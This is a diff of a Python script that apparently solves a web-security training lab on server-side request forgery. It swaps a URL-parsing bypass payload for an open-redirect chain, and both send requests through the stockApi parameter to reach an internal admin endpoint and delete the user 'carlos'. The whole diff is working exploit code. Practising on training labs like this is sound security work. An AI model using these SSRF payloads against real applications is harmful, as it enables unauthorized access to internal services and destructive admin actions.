@@ -11,8 +11,10 @@ proxies = {
 
 def is_delete_user_successful(url):
     delete_user_url_ssrf = (
-        "http://localhost%23@stock.weliketoshop.net"
-        "/admin/delete?username=carlos"
+        "/product/nextProduct?"
+        "currentProductId=1&"
+        "path=http://192.168.0.12:8080/admin/delete?"
+        "username=carlos"
     )
     check_stock_path = "/product/stock"
     parameters = {"stockApi": delete_user_url_ssrf}
@@ -20,14 +22,16 @@ def is_delete_user_successful(url):
         url + check_stock_path,
         data=parameters,
         verify=False,
-        allow_redirects=False,
         proxies=proxies
     )
-    return response.status_code == 302
+    return response.status_code == 200
 
 def is_delete_user_check_successful(url):
     admin_ssrf_payload = (
-        "http://localhost%23@stock.weliketoshop.net/admin")
+        "/product/nextProduct?"
+        "currentProductId=1&"
+        "path=http://192.168.0.12:8080/admin/"
+    )
     check_stock_path = "/product/stock"
     parameters = {"stockApi":admin_ssrf_payload}
     response = requests.post(
